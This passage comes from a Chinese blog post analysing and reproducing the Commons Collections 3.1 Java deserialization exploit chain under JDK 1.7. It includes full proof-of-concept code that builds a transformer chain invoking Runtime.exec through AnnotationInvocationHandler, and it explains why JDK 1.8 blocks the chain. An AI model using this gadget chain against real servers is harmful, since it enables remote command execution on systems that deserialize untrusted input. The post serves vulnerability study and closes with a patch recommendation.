//服务端反序列化成Map格式，再调用transform函数Map outerMap_now = (Map)fin.readObject; //2.1可以直接map添加新值，触发漏洞//outerMap_now.put("123", "123");//2.2也可以获取map键值对，修改value，value为value，foobar,触发漏洞Map.Entry onlyElement = (Map.Entry) outerMap.entrySet.iterator.next;onlyElement.setValue("foobar");}</p><p>亲测有效</p><p><strong>第四步 jdk1.7 AnnotationInvocationHandler的readObject复写点</strong></p><p>上面的漏洞触发条件仍然不够完美，需要服务端把我们传入的序列化内容反序列化为map，并对值进行修改。之前也说过完美的反序列化漏洞还需要一个readobject复写点，使只要服务端执行了readObject函数就等于命令执行。</p><p>在jdk1.7中就存在一个完美的readobject复写点的类sun.reflect.annotation.AnnotationInvocationHandler。我们先看他的构造函数</p><p>AnnotationInvocationHandler(Class&lt;? extends Annotation> var1, Map&lt;String, Object> var2) {Class var3 = var1.getInterfaces; if (var1.isAnnotation && var3.length == 1 && var3[0] == Annotation.class) {//var1满足这个if条件时this.type = var1;//传入的var1到this.typethis.memberValues = var2;//我们的map传入this.memberValues} else { throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");}}</p><p>readobject复写函数：</p><p>private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { //默认反序列化var1.defaultReadObject;AnnotationType var2 = null; try {var2 = AnnotationType.getInstance(this.type);} catch (IllegalArgumentException var9) { throw new InvalidObjectException("Non-annotation type in annotation serial stream");}Map var3 = var2.memberTypes;//Iterator var4 = this.memberValues.entrySet.iterator;//获取我们构造map的迭代器while(var4.hasNext) {Entry var5 = (Entry)var4.next;//遍历map迭代器String var6 = (String)var5.getKey;//获取key的名称Class var7 = (Class)var3.get(var6);//获取var2中相应key的class类？这边具体var3是什么个含义不太懂，但是肯定var7、8两者不一样if (var7 != null) {Object var8 = var5.getValue;//获取map的valueif (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) { //两者类型不一致，给var5赋值！！具体赋值什么已经不关键了！只要赋值了就代表执行命令成功var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass + "[" + var8 + "]")).setMember((Method)var2.members.get(var6)));}}}}}</p><p>虽然相对于这个类具体做什么，实在是没有精力去搞清楚了，但是它最终对于我们传入构造函数的map进行遍历赋值。这样就弥补了我们之前反序列化需要服务端存在一些条件的不足，形成完美反序列化攻击。</p><p>最终模拟攻击代码</p><p>public static void main(String args) throws Exception { //1.客户端构建攻击代码//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), new InvokerTransformer("invoke", new Class {Object.class, Object.class }, new Object {null, new Object[0] }), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})}; //将transformers数组存入ChaniedTransformer这个继承类Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChinaMap innerMap = new HashMap;innerMap.put("value", "value"); //给予map数据转化链Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //反射机制调用AnnotationInvocationHandler类的构造函数Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); //取消构造函数修饰符限制ctor.setAccessible(true); //获取AnnotationInvocationHandler类实例Object instance = ctor.newInstance(Target.class, outerMap); //payload序列化写入文件，模拟网络传输FileOutputStream f = new FileOutputStream("payload.bin");ObjectOutputStream fout = new ObjectOutputStream(f);fout.writeObject(instance); //2.服务端读取文件，反序列化，模拟网络传输FileInputStream fi = new FileInputStream("payload.bin");ObjectInputStream fin = new ObjectInputStream(fi); //服务端反序列化fin.readObject;}</p><p>成功</p><div class=pgc-img><img alt="JAVA反序列化 - commons-collections - 1" onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/a4c79ee037ac4359b1d974630c0e5bb0><p class=pgc-img-caption></p></div><p>至此，我们在客户端构造了payload发送至服务端，只要服务端</p><ol start=1><li>对我们的输入进行反序列化</li><li>jdk版本为1.7</li></ol><p>就可以直接完成命令执行，完美！</p><p><strong>jdk1.8为什么不行呢</strong></p><p>那么jdk1.8为啥不行呢,看一下jdk8里面的sun.reflect.annotation.AnnotationInvocationHandler readObject复写点：</p><p>private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {GetField var2 = var1.readFields;Class var3 = (Class)var2.get("type", (Object)null);Map var4 = (Map)var2.get("memberValues", (Object)null);AnnotationType var5 = null; try {var5 = AnnotationType.getInstance(var3);} catch (IllegalArgumentException var13) { throw new InvalidObjectException("Non-annotation type in annotation serial stream");}Map var6 = var5.memberTypes;LinkedHashMap var7 = new LinkedHashMap;String var10;Object var11; for(Iterator var8 = var4.entrySet.iterator; var8.hasNext; var7.put(var10, var11)) {Entry var9 = (Entry)var8.next;var10 = (String)var9.getKey;var11 = null;Class var12 = (Class)var6.get(var10); if (var12 != null) {var11 = var9.getValue; if (!var12.isInstance(var11) && !(var11 instanceof ExceptionProxy)) { //很伤心的，没有了map赋值语句var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass + "[" + var11 + "]")).setMember((Method)var5.members.get(var10));}}}</p><p>因为这个函数出现了变动，不再有赋值语句，所以触发不了漏洞。</p><p><strong>No.6写在后面</strong></p><p>至此我们就完成common-collection 3.1版本 jdk1.7版本下的POC复现和利用链分析。当然还有common-collection 不同组件版本，不同环境下poc和利用链均有不同，在ysoserial下就有7，8中利用方式。还可以通过rmi模式进行利用等。</p><p>但是由于这篇博客写的太长了，思路也一直断断续续，其他内容之后再陆续学习分析吧~</p><p><strong>No.7修复意见</strong></p><p>commons-collections组件版本 升级至官方最新版本</p></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>'序列化','JAVA','commons'</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=搜索>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>🔍</button></form></section><section class=widget><h3 class=widget-title>最新文章 ⚡</h3><ul class=widget-list></ul></section><section class=widget><h3 class=widget-title>其他</h3><ul class=widget-list><li><a href=TOS.html>使用條款</a></li><li><a href=CommentPolicy.html>留言政策</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>聯絡我們</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>极客快訊</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-146415161-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>